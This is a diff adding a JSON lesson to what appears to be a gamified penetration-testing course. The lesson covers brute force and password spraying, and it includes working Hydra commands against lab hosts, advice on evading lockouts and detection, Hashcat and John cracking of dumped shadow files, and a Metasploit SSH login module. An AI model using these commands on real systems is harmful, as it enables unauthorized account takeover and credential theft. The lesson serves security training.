@@ -1,0 +1,82 @@
+{
+    "id": "l6",
+    "chapterId": "ch_7",
+    "title": "Password Attacks: Brute Force & Spraying 🔑",
+    "description": "Gain access by guessing or cracking credentials.",
+    "xpReward": 35,
+    "estimatedMinutes": 10,
+    "section": "Attacks",
+    "slides": [
+        {
+            "id": "s_l6_1",
+            "type": "text",
+            "title": "The Human Element 👤",
+            "content": "# Why Hack When You Can Log In?\n\nOften, the easiest way in is through a weak or default password.\n\n**Types of Password Attacks:**\n- **Brute Force**: Try every possible combination (time-consuming, noisy).\n- **Dictionary Attack**: Try a list of common passwords (e.g., `rockyou.txt`).\n- **Password Spraying**: Try ONE common password (e.g., `Winter2024!`) against MANY usernames. **Low and slow, evades lockouts.**\n- **Credential Stuffing**: Use leaked username/password pairs from other breaches.\n\n**Targets**: SSH (22), FTP (21), SMB (445), RDP (3389), Web Login Forms."
+        },
+        {
+            "id": "s_l6_2",
+            "type": "text",
+            "title": "Hydra: The Brute Force King 👑",
+            "content": "# Parallelized Login Cracker\n\n**Hydra** is a fast, flexible online password attack tool supporting dozens of protocols.\n\n**Basic Syntax:**\n```bash\nhydra -l [username] -P [password_list] [target] [protocol]\n```\n\n**Examples:**\n```bash\n# SSH: Try passwords against user 'msfadmin'\nhydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 ssh\n\n# FTP: Try users from list and passwords from list\nhydra -L users.txt -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 ftp\n\n# Web Form (POST request)\nhydra -l admin -P wordlist.txt 192.168.56.101 http-post-form \"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed\"\n```"
+        },
+        {
+            "id": "s_l6_3",
+            "type": "quiz",
+            "title": "Hydra Parameters 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l6_1",
+                "type": "multiple_choice",
+                "question": "In Hydra, what does the `-L` flag specify?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "A single username.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "A file containing a list of usernames.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "A single password.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "A file containing a list of passwords.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "`-L` (uppercase) is for a file of usernames; `-l` (lowercase) is for a single username.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l6_4",
+            "type": "text",
+            "title": "Password Spraying with Hydra 🚿",
+            "content": "# Avoiding Account Lockouts\n\nInstead of trying 1000 passwords on 1 account (triggers lockout), try **1 password on 1000 accounts**.\n\n**Command:**\n```bash\nhydra -L users.txt -p 'Winter2024!' 192.168.56.101 ssh\n```\n- `-p` (lowercase) specifies a single password.\n- Hydra will attempt `Winter2024!` for every user in `users.txt`.\n\n**Best Practice**: Wait 30-60 minutes between sprays to blend in with normal authentication traffic."
+        },
+        {
+            "id": "s_l6_5",
+            "type": "text",
+            "title": "Offline Password Cracking: Hashcat 🔐",
+            "content": "# When You Have the Hash File\n\nIf you've gained access to a system and dumped the password hashes (`/etc/shadow` or Windows SAM), you don't need to guess online. You crack them **offline**.\n\n**Tool**: **Hashcat** (GPU-accelerated) or **John the Ripper** (CPU).\n\n**Basic Hashcat Command:**\n```bash\nhashcat -m [mode] -a 0 [hash_file] [wordlist]\n```\n\n**Common Modes:**\n- `0` : MD5\n- `1000` : NTLM (Windows)\n- `1800` : sha512crypt (Linux /etc/shadow)\n\n**Example (Linux Shadow):**\n```bash\n# Combine passwd and shadow\nunshadow passwd.txt shadow.txt > combined.txt\n\n# Crack with John\njohn --wordlist=/usr/share/wordlists/rockyou.txt combined.txt\n```"
+        },
+        {
+            "id": "s_l6_6",
+            "type": "warning",
+            "title": "Online Brute Force Danger ⚠️",
+            "content": "## You Will Be Detected\n\nHydra generates a massive number of login attempts. This **will** fill logs and likely trigger alerts. In a real test:\n- Get **explicit permission** for password attacks.\n- Use **small, targeted wordlists**.\n- Use **throttling** (`-t 4` to reduce threads)."
+        },
+        {
+            "id": "s_l6_7",
+            "type": "tip",
+            "title": "Pro Tip: Metasploit Scanners 🚀",
+            "content": "## Auxiliary Modules for Brute Force\n\nMetasploit has auxiliary modules for password attacks that integrate nicely with sessions.\n\n```bash\nmsf6 > use auxiliary/scanner/ssh/ssh_login\nmsf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.56.101\nmsf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME msfadmin\nmsf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > run\n```\n\nIf it succeeds, it automatically creates a Metasploit session!"
+        }
+    ]
+}
